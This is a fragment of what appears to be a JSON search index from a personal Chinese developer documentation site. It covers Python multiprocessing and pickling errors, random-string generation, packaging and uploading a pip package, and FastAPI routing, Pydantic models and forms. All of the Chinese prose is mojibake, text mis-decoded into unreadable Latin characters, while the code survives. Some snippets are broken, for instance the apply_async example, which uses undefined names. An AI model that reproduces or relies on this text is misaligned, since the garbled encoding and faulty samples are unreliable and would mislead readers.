‡å‡†åº“/multiprocessing çš„ Lock() å‡½æ•° ç¼“å†²I/O åˆ†ä¸ºï¼šæ— ç¼“å†²ï¼Œè¡Œç¼“å†²ï¼Œå…¨ç¼“å†² é€šè¿‡ read å’Œ write ç³»ç»Ÿè°ƒç”¨ç›´æ¥è¯»å†™æ–‡ä»¶ï¼Œå°±æ˜¯æ— ç¼“å†²æ¨¡å¼ï¼Œæ€§èƒ½ä¹Ÿæœ€å·®ã€‚ è€Œé€šè¿‡æ ‡å‡† I/O åº“è¯»å†™æ–‡ä»¶ï¼Œå°±æ˜¯ç¼“å†²æ¨¡å¼ï¼Œæ ‡å‡† I/O åº“æä¾›ç¼“å†²çš„ç›®çš„æ˜¯å°½å¯èƒ½å‡å°‘ read å’Œ write è°ƒç”¨çš„æ¬¡æ•°ï¼Œæé«˜æ€§èƒ½ã€‚ è¡Œç¼“å†²æ¨¡å¼ å½“åœ¨è¾“å…¥è¾“å‡ºä¸­é‡åˆ°æ¢è¡Œç¬¦æ—¶ï¼Œæ‰è¿›è¡Œå®é™… I/O æ“ä½œã€‚ å…¨ç¼“å†²æ¨¡å¼ å½“å¡«æ»¡ç¼“å†²åŒºæ—¶ï¼Œæ‰è¿›è¡Œå®é™… I/O æ“ä½œã€‚ ç®¡é“å’Œæ™®é€šæ–‡ä»¶é»˜è®¤æ˜¯å…¨ç¼“å†²çš„; æ ‡å‡†è¾“å…¥å’Œæ ‡å‡†è¾“å‡ºé»˜è®¤æ˜¯è¡Œç¼“å†²çš„; æ ‡å‡†é”™è¯¯é»˜è®¤æ˜¯æ— ç¼“å†²çš„ã€‚ è·å–å­è¿›ç¨‹çš„è¿”å›å€¼ é˜Ÿåˆ—: multiprocessing.Queue() Pool.map(): from multiprocessing import Pool import time def func(i): return i*i if __name__ == '__main__': p = Pool(5) ret = p.map(func,range(10)) print(ret) pool.apply_async: from multiprocessing import Pool def func(): return 1 pool = multiprocessing.Pool(processes=1) p = pool.apply_async(func, (i,)) pool.close() # å…³é—­è¿›ç¨‹æ± ï¼Œè¡¨ç¤ºä¸èƒ½å†å¾€è¿›ç¨‹æ± ä¸­æ·»åŠ è¿›ç¨‹ï¼Œéœ€è¦åœ¨joinä¹‹å‰è°ƒç”¨ pool.join() # ç­‰å¾…è¿›ç¨‹æ± ä¸­çš„æ‰€æœ‰è¿›ç¨‹æ‰§è¡Œå®Œæ¯• print(p.get()) # ä½¿ç”¨getè·å–å€¼ multiprocessing.Manager: from multiprocessing import Manager Manager().list() ä¸€äº›æŠ¥é”™ can't pickle _thread.lock objects ä½¿ç”¨è¿›ç¨‹æ± æŠ¥é”™, TypeError: can't pickle _thread.lock objects from concurrent.futures.process import ProcessPoolExecutor è¿›ç¨‹æ± å†…éƒ¨å¤„ç†ä½¿ç”¨äº†pickleæ¨¡å—(ç”¨äºpythonç‰¹æœ‰çš„ç±»å‹å’Œpythonçš„æ•°æ®ç±»å‹é—´è¿›è¡Œè½¬æ¢) ä¸­çš„dump(obj, file, protocol=None,)æ–¹æ³•å¯¹å‚æ•°è¿›è¡Œäº†å°è£…å¤„ç†. è€Œpickle dump æ–¹æ³•ä¸æ”¯æŒè‡ªå®šä¹‰çš„ç±». pickleç”¨æ¥åºåˆ—åŒ–å¯¹è±¡å¾ˆæ–¹ä¾¿, ä½†æ˜¯pickleå¯¹ä¼ å…¥å¯¹è±¡çš„è¦æ±‚æ˜¯ä¸èƒ½æ˜¯å†…éƒ¨ç±», ä¹Ÿä¸èƒ½æ˜¯lambdaå‡½æ•°. è§£å†³ æ–¹æ³•ä¸€: ä½¿ç”¨dillåŒ…æ¥ä»£æ›¿, ä½¿ç”¨æ–¹æ³•å’Œpickleä¸€æ ·: pip install dill ä½¿ç”¨: import dill class Obj: def __init__(self, info): self.info = info obj = Obj(\"this is a local object\") pk = dill.dumps(obj) new_obj = dill.loads(pk) dillæ‰©å±•äº†pythonçš„pickleæ¨¡å—, ç”¨äºå¯¹å¤§å¤šæ•°å†…ç½®pythonç±»å‹è¿›è¡Œåºåˆ—åŒ–å’Œååºåˆ—åŒ–. åºåˆ—åŒ–æ˜¯å°†å¯¹è±¡è½¬æ¢ä¸ºå­—èŠ‚æµçš„è¿‡ç¨‹, è€Œç›¸åçš„è¿‡ç¨‹æ˜¯å°†å­—èŠ‚æµè½¬æ¢å›pythonå¯¹è±¡å±‚æ¬¡ç»“æ„. æ‰€ä»¥å¦‚æœé‡åˆ°äº†pickleæ¨¡å—æ— æ³•åºåˆ—åŒ–çš„å¯¹è±¡, ä¸å¦¨è¯•è¯•dill. æ–¹æ³•äºŒ: from pathos.multiprocessing import ProcessingPool ä½¿ç”¨pathosçš„è¿›ç¨‹æ±  https://github.com/uqfoundation/pathos æ–¹æ³•ä¸‰: å°†å®šä¹‰(æˆ–è€…è¯´å®šä¹‰çš„é—­åŒ…)æ”¾åœ¨å¤–éƒ¨ ä¸€äº›å‘ ç³»ç»Ÿ: MacOS 12. Python3.9 å¤šè¿›ç¨‹ä½¿ç”¨ multiprocessing.Lock , å¦‚æœå®šä¹‰åœ¨å…¨å±€å˜é‡ç„¶åä½¿ç”¨æ˜¯ä¸å¯è¡Œçš„. threadingæ¨¡å—è²Œä¼¼æ²¡æœ‰è¿™ä¸ªé—®é¢˜, åº”è¯¥æ˜¯å…¨å±€è§£é‡Šå™¨é”çš„åŸå› . å…¨å±€å®šä¹‰ç¤ºä¾‹ä»£ç : # coding: utf-8 import time from multiprocessing import Lock, Process lock = Lock() def run1(): lock.acquire() print('run1 get lock') time.sleep(3) def run2(): lock.acquire() print('run2 get lock') time.sleep(3) print('run2 release lock') lock.release() if __name__ == '__main__': p1 = Process(target=run1,) p2 = Process(target=run2,) p1.start() p1.join() p2.start() time.sleep(5) print('main thread release lock') lock.release() é”™è¯¯è¾“å‡º: run1 get lock run2 get lock run2 release lock Traceback (most recent call last): File \"/Users/yanque/project/pycharm/mytest/with_mul_process/global_lock2.py\", line 30, in <module> lock.release() ValueError: semaphore or lock released too many times main thread release lock å¯ä»¥çœ‹åˆ°è¿ç»­ acquire äº†ä¸¤æ¬¡é”... è€Œä¸”ä¹‹å‰çš„demoè¿˜æ²¡æœ‰æŠ¥é”™ä¿¡æ¯ è¿™é‡Œä¼°è®¡æ˜¯å˜é‡çš„å¤šè¿›ç¨‹å¤šæ ¸è®¿é—®é—®é¢˜, ç½‘ä¸Šå¾ˆå¤šæ–‡ç« éƒ½ç”¨çš„å…¨å±€å˜é‡å®šä¹‰, è¯¯å¯¼äºº. ä¸ä½¿ç”¨å…¨å±€å˜é‡è€Œæ˜¯ä¼ å€¼ä¹‹å: # coding: utf-8 import time from multiprocessing import Lock, Process def run1(lock: Lock): lock.acquire() print('run1 get lock') time.sleep(3) def run2(lock: Lock): lock.acquire() print('run2 get lock') time.sleep(3) print('run2 release lock') lock.release() if __name__ == '__main__': _lock = Lock() p1 = Process(target=run1, args=(_lock,), ) p2 = Process(target=run2, args=(_lock,), ) p1.start() p1.join() p2.start() time.sleep(5) print('main thread release lock') _lock.release() è¾“å‡ºæ­£å¸¸äº†: run1 get lock main thread release lock run2 get lock run2 release lock å½“å¤©ä¸‹ç­æƒ³èµ·è¿™ä¸ªé—®é¢˜, çªç„¶ååº”è¿‡æ¥ ä¸åŒè¿›ç¨‹åˆ†é…çš„æ˜¯ä¸åŒçš„èµ„æº, æ‰€ä»¥ä½¿ç”¨å…¨å±€å˜é‡çš„æ—¶å€™, æ¯ä¸ªè¿›ç¨‹ä½¿ç”¨çš„éƒ½æ˜¯ä¸åŒçš„å…¨å±€å˜é‡, æ‰€ä»¥ä¼šå‡ºç°å¼‚å¸¸çš„é—®é¢˜.","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-Concept-multi-Progress.html","loc":"/yq-doc-source-docs-rear-end-python-Concept-multi-Progress.html"},{"title":"ç”Ÿæˆéšæœºå­—ç¬¦ä¸²","text":"ç”Ÿæˆéšæœºå­—ç¬¦ä¸²: #!/usr/bin/env python2.7 # -*- coding: utf-8 -*- import random import string def ranstr(num): salt = ''.join(random.sample(string.ascii_letters + string.digits, num)) return salt salt = ranstr(6) print salt random.sample(str, num) ä»strå­—ç¬¦ä¸²ä¸­éšæœºé€‰å–numä¸ªå­—ç¬¦ string.ascii_letters è¿”å›26ä¸ªè‹±æ–‡å­—æ¯çš„å¤§å°å†™å­—ç¬¦ä¸² string.digits è¿”å›é˜¿æ‹‰ä¼¯æ•°å­—çš„å­—ç¬¦ä¸²ã€‚","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-Tutorial-Generate-random-string.html","loc":"/yq-doc-source-docs-rear-end-python-Tutorial-Generate-random-string.html"},{"title":"è‡ªåˆ¶pipåŒ…","text":"è‡ªåˆ¶pipåŒ…, æ‰“åŒ…ä¸º whl / tar.gz æ ¼å¼ é¦–å…ˆéœ€è¦è‡ªå·±çš„ä¸€ä»½æºç , ä¸€èˆ¬ç»“æ„å¦‚ä¸‹, srcç›®å½•ä¸‹æ˜¯è‡ªå·±çš„æºä»£ç , æ³¨æ„è¦æœ‰ __init__ æ–‡ä»¶è¡¨ç¤ºæ˜¯ä¸€ä¸ªpythonæ¨¡å—: â”œâ”€â”€ LICENSE â”œâ”€â”€ README.md â”œâ”€â”€ pyproject.toml â”œâ”€â”€ setup.py â””â”€â”€ src â”œâ”€â”€ __init__.py â””â”€â”€ win_clip_file.py å…¶ä»–æ ¹ç›®å½•ä¸‹æ–‡ä»¶æ˜¯ç›¸å…³é…ç½®, å…¶ä¸­setup.pyæ˜¯ç”Ÿæˆè„šæœ¬, ä¸€èˆ¬å†…å®¹å¦‚ä¸‹, æ ¹æ®å®é™…ä¿®æ”¹: from setuptools import setup, find_packages setup(name='win_clipboard', version='0.0.1', description='to windows, copy file', # long_description='', # long_description_content_type=\"text/markdown\", # æ¨¡å—è¯¦ç»†ä»‹ç»æ ¼å¼ # url=\"githubåœ°å€\", # æ¨¡å—githubåœ°å€ author='yan que', author_email='yanquer@qq.com', requires=['win32clipboard', ], # å®šä¹‰ä¾èµ–å“ªäº›æ¨¡å— # packages=find_packages(), # ç³»ç»Ÿè‡ªåŠ¨ä»å½“å‰ç›®å½•å¼€å§‹æ‰¾åŒ… # å¦‚æœæœ‰çš„æ–‡ä»¶ä¸ç”¨æ‰“åŒ…ï¼Œåˆ™åªèƒ½æŒ‡å®šéœ€è¦æ‰“åŒ…çš„æ–‡ä»¶ packages=['win_clipboard', ], # æŒ‡å®šç›®å½•ä¸­éœ€è¦æ‰“åŒ…çš„pyæ–‡ä»¶ï¼Œæ³¨æ„ä¸è¦.pyåç¼€ # æ¨¡å—ç›¸å…³çš„å…ƒæ•°æ®ï¼ˆæ›´å¤šçš„æè¿°ï¼‰ # classifiers=[ # \"Programming Language :: Python :: 3\", # \"License :: OSI Approved :: MIT License\", # \"Operating System :: Independent\", # ], # ä¾èµ–æ¨¡å— install_requires=[ \"pywin32\" ], # pythonç‰ˆæœ¬ python_requires=\">=3\", license=\"apache 3.0\" ) setupå‚æ•°è¯´æ˜: name æ‰“åŒ…ååŒ…çš„æ–‡ä»¶å version ç‰ˆæœ¬å· author ä½œè€… author_email ä½œè€…çš„é‚®ç®± py_modules è¦æ‰“åŒ…çš„.pyæ–‡ä»¶ packages æ‰“åŒ…çš„pythonæ–‡ä»¶å¤¹ include_package_data é¡¹ç›®é‡Œä¼šæœ‰ä¸€äº›épyæ–‡ä»¶,æ¯”å¦‚htmlå’Œjsç­‰,è¿™æ—¶å€™å°±è¦é include_package_data å’Œ package_data æ¥æŒ‡å®šäº†ã€‚ package_data:ä¸€èˆ¬å†™æˆ{â€˜your_package_name': [\"files\"]}, include_package_dataè¿˜æ²¡å®Œ,è¿˜éœ€è¦ä¿®æ”¹MANIFEST.inæ–‡ä»¶. MANIFEST.inæ–‡ä»¶çš„è¯­æ³•ä¸º: include xxx/xxx/xxx/.ini/(æ‰€æœ‰ä»¥.iniç»“å°¾çš„æ–‡ä»¶,ä¹Ÿå¯ä»¥ç›´æ¥æŒ‡å®šæ–‡ä»¶å) license æ”¯æŒçš„å¼€æºåè®® description å¯¹é¡¹ç›®ç®€çŸ­çš„ä¸€ä¸ªå½¢å®¹ ext_modules æ˜¯ä¸€ä¸ªåŒ…å«Extensionå®ä¾‹çš„åˆ—è¡¨,Extensionçš„å®šä¹‰ä¹Ÿæœ‰ä¸€äº›å‚æ•°ã€‚ ext_package å®šä¹‰extensionçš„ç›¸å¯¹è·¯å¾„ requires å®šä¹‰ä¾èµ–å“ªäº›æ¨¡å— provides å®šä¹‰å¯ä»¥ä¸ºå“ªäº›æ¨¡å—æä¾›ä¾èµ– data_files æŒ‡å®šå…¶ä»–çš„ä¸€äº›æ–‡ä»¶(å¦‚é…ç½®æ–‡ä»¶),è§„å®šäº†å“ªäº›æ–‡ä»¶è¢«å®‰è£…åˆ°å“ªäº›ç›®å½•ä¸­ã€‚ å¦‚æœç›®å½•åæ˜¯ç›¸å¯¹è·¯å¾„,åˆ™æ˜¯ç›¸å¯¹äºsys.prefixæˆ–sys.exec_prefixçš„è·¯å¾„ã€‚å¦‚æœæ²¡æœ‰æä¾›æ¨¡æ¿,ä¼šè¢«æ·»åŠ åˆ°MANIFESTæ–‡ä»¶ä¸­ æ‰“åŒ…: python setup.py bdist_wheel # æ‰“åŒ…ä¸ºwhlæ–‡ä»¶ python setup.py sdist # æ‰“åŒ…ä¸ºtar.gzæ–‡ä»¶ ä¼šç”Ÿæˆåœ¨å½“å‰ç›®å½•ä¸‹distæ–‡ä»¶å¤¹ä¸‹é¢ è‹¥éœ€è¦ä¸Šä¼ åˆ°pypi éœ€è¦å…ˆå»æ³¨å†Œè´¦å· https://pypi.org/ ä¸Šä¼ éœ€è¦å®‰è£…twine: pip install twine twine upload dist/* # è¾“å…¥åˆšæ³¨å†Œçš„ç”¨æˆ·åå¯†ç å°±èƒ½ä¸Šä¼ ã€‚","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-Tutorial-Homemade-PIP-package.html","loc":"/yq-doc-source-docs-rear-end-python-Tutorial-Homemade-PIP-package.html"},{"title":"åŸºæœ¬è·¯ç”±","text":"å‚è€ƒ: FastAPI åŸºæœ¬è·¯ç”± å¯ä»¥å…ˆçœ‹å‰é¢çš„ä¾‹å­: /docs/åç«¯/python/Webæ¡†æ¶/FastAPI/ç®€å•ä½¿ç”¨ å®šä¹‰è·¯ç”±æ˜¯è£…é¥°å™¨: @app.get(\"/\")","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-Web-framework-Fastapi-Basic-route.html","loc":"/yq-doc-source-docs-rear-end-python-Web-framework-Fastapi-Basic-route.html"},{"title":"ç»“æ„è¯¦è§£","text":"æºäº: FastAPI FastAPI ç«™åœ¨ä»¥ä¸‹å·¨äººçš„è‚©è†€ä¹‹ä¸Šï¼š Starlette è´Ÿè´£ web éƒ¨åˆ†ã€‚ Pydantic è´Ÿè´£æ•°æ®éƒ¨åˆ†ã€‚","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-Web-framework-Fastapi-Detailed-structure.html","loc":"/yq-doc-source-docs-rear-end-python-Web-framework-Fastapi-Detailed-structure.html"},{"title":"FastAPI-Pydanticæ¨¡å‹","text":"å‚è€ƒ: FastAPI Pydantic æ¨¡å‹ Pydantic æ˜¯ä¸€ä¸ªç”¨äºæ•°æ®éªŒè¯å’Œåºåˆ—åŒ–çš„ Python æ¨¡å‹åº“ã€‚ å®ƒåœ¨ FastAPI ä¸­å¹¿æ³›ä½¿ç”¨ï¼Œç”¨äºå®šä¹‰è¯·æ±‚ä½“ã€å“åº”ä½“å’Œå…¶ä»–æ•°æ®æ¨¡å‹ï¼Œæä¾›äº†å¼ºå¤§çš„ç±»å‹æ£€æŸ¥å’Œè‡ªåŠ¨æ–‡æ¡£ç”ŸæˆåŠŸèƒ½ã€‚ ä»¥ä¸‹æ˜¯å…³äº Pydantic æ¨¡å‹çš„è¯¦ç»†ä»‹ç»ï¼š å®šä¹‰ Pydantic æ¨¡å‹ ä½¿ç”¨ Pydantic å®šä¹‰ä¸€ä¸ªæ¨¡å‹éå¸¸ç®€å•ï¼Œåªéœ€åˆ›å»ºä¸€ä¸ªç»§æ‰¿è‡ª pydantic.BaseModel çš„ç±»ï¼Œ å¹¶åœ¨å…¶ä¸­å®šä¹‰å­—æ®µã€‚å­—æ®µçš„ç±»å‹å¯ä»¥æ˜¯ä»»ä½•æœ‰æ•ˆçš„ Python ç±»å‹ï¼Œä¹Ÿå¯ä»¥æ˜¯ Pydantic å†…ç½®çš„ç±»å‹: from pydantic import BaseModel class Item(BaseModel): name: str description: str = None price: float tax: float = None ä»¥ä¸Šä»£ç ä¸­ä¸­ï¼Œæˆ‘ä»¬å®šä¹‰äº†ä¸€ä¸ªåä¸º Item çš„ Pydantic æ¨¡å‹ï¼Œ åŒ…å«äº†å››ä¸ªå­—æ®µï¼šnameã€descriptionã€price å’Œ taxï¼Œname å’Œ price æ˜¯å¿…éœ€çš„å­—æ®µï¼Œ è€Œ description å’Œ tax æ˜¯å¯é€‰çš„å­—æ®µï¼Œå…¶ä¸­ tax çš„é»˜è®¤å€¼ä¸º Noneã€‚ ä½¿ç”¨ Pydantic æ¨¡å‹ è¯·æ±‚ä½“éªŒè¯ åœ¨ FastAPI ä¸­ï¼Œå¯ä»¥å°† Pydantic æ¨¡å‹ç”¨ä½œè¯·æ±‚ä½“ï¼ˆRequest Bodyï¼‰ï¼Œ ä»¥è‡ªåŠ¨éªŒè¯å’Œè§£æå®¢æˆ·ç«¯å‘é€çš„æ•°æ®: from fastapi import FastAPI from pydantic import BaseModel app = FastAPI() class Item(BaseModel): name: str description: str = None price: float tax: float = None @app.post(\"/items/\") def create_item(item: Item): return item ä»¥ä¸Šä»£ç ä¸­ä¸­ï¼Œcreate_item è·¯ç”±å¤„ç†å‡½æ•°æ¥å—ä¸€ä¸ªåä¸º item çš„å‚æ•°ï¼Œ å…¶ç±»å‹æ˜¯ Item æ¨¡å‹ã€‚FastAPI å°†è‡ªåŠ¨éªŒè¯ä¼ å…¥çš„ JSON æ•°æ®æ˜¯å¦ç¬¦åˆæ¨¡å‹çš„å®šä¹‰ï¼Œ å¹¶å°†å…¶è½¬æ¢ä¸º Item ç±»å‹çš„å®ä¾‹ã€‚ æŸ¥è¯¢å‚æ•°éªŒè¯ Pydantic æ¨¡å‹è¿˜å¯ä»¥ç”¨äºéªŒè¯æŸ¥è¯¢å‚æ•°ã€è·¯å¾„å‚æ•°ç­‰: from fastapi import FastAPI, Query from pydantic import BaseModel app = FastAPI() class Item(BaseModel): name: str description: str = None price: float tax: float = None @app.get(\"/items/\") def read_item(item: Item, q: str = Query(..., max_length=10)): return {\"item\": item, \"q\": q} ä»¥ä¸Šä»£ç ä¸­ï¼Œread_item è·¯ç”±å¤„ç†å‡½æ•°æ¥å—ä¸€ä¸ª Item æ¨¡å‹çš„å®ä¾‹ä½œä¸ºæŸ¥è¯¢å‚æ•°ï¼Œ ä»¥åŠä¸€ä¸ªåä¸º q çš„å­—ç¬¦ä¸²æŸ¥è¯¢å‚æ•°ã€‚ é€šè¿‡ä½¿ç”¨ Query å‡½æ•°ï¼Œæˆ‘ä»¬è¿˜å¯ä»¥ä¸ºæŸ¥è¯¢å‚æ•°æŒ‡å®šæ›´å¤šçš„éªŒè¯è§„åˆ™ï¼Œå¦‚æœ€å¤§é•¿åº¦é™åˆ¶ã€‚ è‡ªåŠ¨æ–‡æ¡£ç”Ÿæˆ ä½¿ç”¨ Pydantic æ¨¡å‹çš„ä¸€ä¸ªé‡è¦ä¼˜åŠ¿æ˜¯ï¼Œå®ƒèƒ½å¤Ÿè‡ªåŠ¨ä¸º FastAPI ç”Ÿæˆäº¤äº’å¼ API æ–‡æ¡£ã€‚ æ–‡æ¡£ä¼šåŒ…æ‹¬æ¨¡å‹çš„å­—æ®µã€ç±»å‹ã€éªŒè¯è§„åˆ™ç­‰ä¿¡æ¯ï¼Œè®©å¼€å‘è€…å’Œ API ä½¿ç”¨è€…èƒ½å¤Ÿæ¸…æ™°åœ°äº†è§£å¦‚ä½•æ­£ç¡®ä½¿ç”¨ APIã€‚ æ•°æ®è½¬æ¢å’Œåºåˆ—åŒ– Pydantic æ¨¡å‹ä¸ä»…æä¾›äº†éªŒè¯åŠŸèƒ½ï¼Œè¿˜å¯ä»¥ç”¨äºå°†æ•°æ®è½¬æ¢ä¸ºç‰¹å®šç±»å‹ï¼ˆä¾‹å¦‚ JSONï¼‰æˆ–åå‘åºåˆ—åŒ–ã€‚ åœ¨ FastAPI ä¸­ï¼Œè¿™ç§èƒ½åŠ›æ˜¯è‡ªåŠ¨çš„ï¼Œä½ æ— éœ€æ‰‹åŠ¨å¤„ç†ã€‚ é€šè¿‡ä½¿ç”¨ Pydantic æ¨¡å‹ï¼Œä½ å¯ä»¥æ›´è½»æ¾åœ°å®šä¹‰å’ŒéªŒè¯æ•°æ®ï¼Œ ä½¿å¾—ä»£ç æ›´æ¸…æ™°ã€æ›´å¥å£®ï¼Œå¹¶é€šè¿‡è‡ªåŠ¨ç”Ÿæˆçš„æ–‡æ¡£æä¾›æ›´å¥½çš„ API äº¤äº’ä½“éªŒã€‚","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-Web-framework-Fastapi-Fastapi-Pydantic-model.html","loc":"/yq-doc-source-docs-rear-end-python-Web-framework-Fastapi-Fastapi-Pydantic-model.html"},{"title":"è¡¨å•æ•°æ®","text":"åœ¨ FastAPI ä¸­ï¼Œæ¥æ”¶è¡¨å•æ•°æ®æ˜¯ä¸€ç§å¸¸è§çš„æ“ä½œï¼Œé€šå¸¸ç”¨äºå¤„ç†ç”¨æˆ·é€šè¿‡ HTML è¡¨å•æäº¤çš„æ•°æ®ã€‚ FastAPI æä¾›äº† Form ç±»å‹ï¼Œå¯ä»¥ç”¨äºå£°æ˜å’ŒéªŒè¯è¡¨å•æ•°æ®ã€‚ å£°æ˜è¡¨å•æ•°æ®æ¨¡å‹ æ¥ä¸‹æ¥æˆ‘ä»¬è®¾è®¡ä¸€ä¸ªæ¥æ”¶ä¸€ä¸ªç™»é™†çš„è¡¨å•æ•°æ®ï¼Œè¦ä½¿ç”¨è¡¨å•ï¼Œéœ€é¢„å…ˆå®‰è£… python-multipart: pip install python-multipart ä»£ç å¦‚ä¸‹: from fastapi import FastAPI, Form app = FastAPI() @app.post(\"/login/\") async def login(username: str = Form(), password: str = Form()): return {\"username\": username} æ¥ä¸‹æ¥æˆ‘ä»¬å¯ä»¥è¿›å…¥ API æ–‡æ¡£ http://127.0.0.1:8000/docs è¿›è¡Œæµ‹éªŒ å“åº”: ä½¿ç”¨ Pydantic æ¨¡å‹æ¥å£°æ˜è¡¨å•æ•°æ®æ¨¡å‹ã€‚ åœ¨æ¨¡å‹ä¸­ï¼Œä½¿ç”¨ Field ç±»å‹å£°æ˜æ¯ä¸ªè¡¨å•å­—æ®µï¼Œå¹¶æ·»åŠ å¿…è¦çš„éªŒè¯è§„åˆ™: from pydantic import BaseModel, Field class Item(BaseModel): name: str = Field(..., title=\"Item Name\", max_length=100) description: str = Field(None, title=\"Item Description\", max_length=255) price: float = Field(..., title=\"Item Price\", gt=0) é™¤äº†å¯ä»¥åœ¨ API æ–‡æ¡£ä¸­æµ‹éªŒï¼Œå¦å¤–æˆ‘ä»¬ä¹Ÿå¯ä»¥è‡ªå·±åˆ›å»º html æ¥æµ‹è¯•: <form action=\"http://localhost:8000/items/\" method=\"post\"> <label for=\"name\">Name:</label> <input type=\"text\" id=\"name\" name=\"name\" required> <br> <label for=\"description\">Description:</label> <textarea id=\"description\" name=\"description\"></textarea> <br> <label for=\"price\">Price:</label> <input type=\"number\" id=\"price\" name=\"price\" required min=\"0\"> <br> <button type=\"submit\">Submit</button> </form> åœ¨è·¯ç”±ä¸­æ¥æ”¶è¡¨å•æ•°æ® åœ¨è·¯ç”±æ“ä½œå‡½æ•°ä¸­ï¼Œå¯ä»¥ä½¿ç”¨ Form ç±»å‹æ¥æ¥æ”¶è¡¨å•æ•°æ®ã€‚ Form ç±»å‹çš„å‚æ•°å¯ä»¥ä¸ Pydantic æ¨¡å‹çš„å­—æ®µä¸€ä¸€å¯¹åº”ï¼Œä»¥å®ç°è¡¨å•æ•°æ®çš„éªŒè¯å’Œè½¬æ¢: from fastapi import FastAPI, Form app = FastAPI() # è·¯ç”±æ“ä½œå‡½æ•° @app.post(\"/items/\") async def create_item( name: str = Form(...), description: str = Form(None), price: float = Form(..., gt=0), ): return {\"name\": name, \"description\": description, \"price\": price} ä»¥ä¸Šä¾‹å­ä¸­ï¼Œcreate_item è·¯ç”±æ“ä½œå‡½æ•°æ¥æ”¶äº†ä¸‰ä¸ªè¡¨å•å­—æ®µ: nameã€description å’Œ priceï¼Œ è¿™äº›å­—æ®µä¸ Item æ¨¡å‹çš„ç›¸åº”å­—æ®µä¸€è‡´ï¼ŒFastAPI å°†è‡ªåŠ¨æ ¹æ®éªŒè¯è§„åˆ™éªŒè¯è¡¨å•æ•°æ®ã€‚ æ¥ä¸‹æ¥æˆ‘ä»¬å¯ä»¥è¿›å…¥ API æ–‡æ¡£ http://127.0.0.1:8000/docs è¿›è¡Œæµ‹éªŒï¼š å“åº”: è¡¨å•æ•°æ®çš„éªŒè¯å’Œæ–‡æ¡£ç”Ÿæˆ ä½¿ç”¨ Pydantic æ¨¡å‹å’Œ Form ç±»å‹ï¼Œè¡¨å•æ•°æ®çš„éªŒè¯å’Œæ–‡æ¡£ç”Ÿæˆéƒ½æ˜¯è‡ªåŠ¨çš„ã€‚ FastAPI å°†æ ¹æ®æ¨¡å‹ä¸­çš„å­—æ®µä¿¡æ¯ç”Ÿæˆäº¤äº’å¼ API æ–‡æ¡£ï¼Œå¹¶æ ¹æ®éªŒè¯è§„åˆ™è¿›è¡Œæ•°æ®éªŒè¯ã€‚ API æ–‡æ¡£åœ°å€ http://127.0.0.1:8000/docs ã€‚ å¤„ç†æ–‡ä»¶ä¸Šä¼  å¦‚æœè¡¨å•åŒ…å«æ–‡ä»¶ä¸Šä¼ ï¼Œå¯ä»¥ä½¿ç”¨ UploadFile ç±»å‹å¤„ç†ã€‚ ä»¥ä¸‹æ˜¯ä¸€ä¸ªå¤„ç†æ–‡ä»¶ä¸Šä¼ çš„å®ä¾‹: from fastapi import FastAPI, File, UploadFile app = FastAPI() # è·¯ç”±æ“ä½œå‡½æ•° @app.post(\"/files/\") async def create_file(file: UploadFile = File(...)): return {\"filename\": file.filename} åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œcreate_file è·¯ç”±æ“ä½œå‡½æ•°æ¥æ”¶äº†ä¸€ä¸ª UploadFile ç±»å‹çš„æ–‡ä»¶å‚æ•°ã€‚ FastAPI å°†è´Ÿè´£å¤„ç†æ–‡ä»¶ä¸Šä¼ ï¼Œå¹¶å°†æ–‡ä»¶çš„ç›¸å…³ä¿¡æ¯åŒ…è£…åœ¨ UploadFile å¯¹è±¡ä¸­ï¼Œ å¯ä»¥è½»æ¾åœ°è·å–æ–‡ä»¶åã€å†…å®¹ç±»å‹ç­‰ä¿¡æ¯ã€‚ é€šè¿‡ä¸Šè¿°æ–¹å¼ï¼ŒFastAPI æä¾›äº†ä¸€ç§ç®€å•è€Œå¼ºå¤§çš„æ–¹æ³•æ¥æ¥æ”¶å’Œå¤„ç†è¡¨å•æ•°æ®ï¼ŒåŒæ—¶ä¿æŒäº†ä»£ç çš„æ¸…æ™°æ€§å’Œå¯ç»´æŠ¤æ€§ã€‚","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-Web-framework-Fastapi-Form-data.html","loc":"/yq-doc-source-docs-rear-end-python-Web-framework-Fastapi-Form-data.html"},{"title":"å®‰è£…é…ç½®","text":"FastAPI ä¾èµ– Python 3.8 åŠæ›´é«˜ç‰ˆæœ¬ã€‚ å®‰è£… FastAPI å¾ˆç®€å•ï¼Œè¿™é‡Œæˆ‘ä»¬ä½¿ç”¨ pip å‘½ä»¤æ¥å®‰è£…: pip install fastapi å¦å¤–æˆ‘ä»¬è¿˜éœ€è¦ä¸€ä¸ª ASGI æœåŠ¡å™¨ï¼Œç”Ÿäº§ç¯å¢ƒå¯ä»¥ä½¿ç”¨ Uvicorn æˆ–è€… Hypercorn : pip install \"uvicorn[standard]\" æ³¨è§£ ä¸¤ä¸ªåˆèµ·æ¥å°±æ˜¯: pip install fastapi \"uvicorn[standard]\"","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-Web-framework-Fastapi-Installation.html","loc":"/yq-doc-source-docs-rear-end-python-Web-framework-Fastapi-Installation.html"},{"title":"äº¤äº’å¼APIæ–‡æ¡£","text":"å‚è€ƒ: FastAPI äº¤äº’å¼ API æ–‡æ¡£ FastAPI æä¾›äº†å†…ç½®çš„äº¤äº’å¼ API æ–‡æ¡£ï¼Œä½¿å¼€å‘è€…èƒ½å¤Ÿè½»æ¾äº†è§£å’Œæµ‹è¯• API çš„å„ä¸ªç«¯ç‚¹ã€‚ è¿™ä¸ªæ–‡æ¡£æ˜¯è‡ªåŠ¨ç”Ÿæˆçš„ï¼ŒåŸºäº OpenAPI è§„èŒƒï¼Œ æ”¯æŒ Swagger UI å’Œ ReDoc ä¸¤ç§äº¤äº’å¼ç•Œé¢ã€‚ é€šè¿‡ FastAPI çš„äº¤äº’å¼ API æ–‡æ¡£ï¼Œå¼€å‘è€…èƒ½å¤Ÿæ›´è½»æ¾åœ°ç†è§£å’Œä½¿ç”¨ APIï¼Œæé«˜å¼€å‘æ•ˆç‡ åœ¨è¿è¡Œ FastAPI åº”ç”¨æ—¶ï¼ŒUvicorn åŒæ—¶å¯åŠ¨äº†äº¤äº’å¼ API 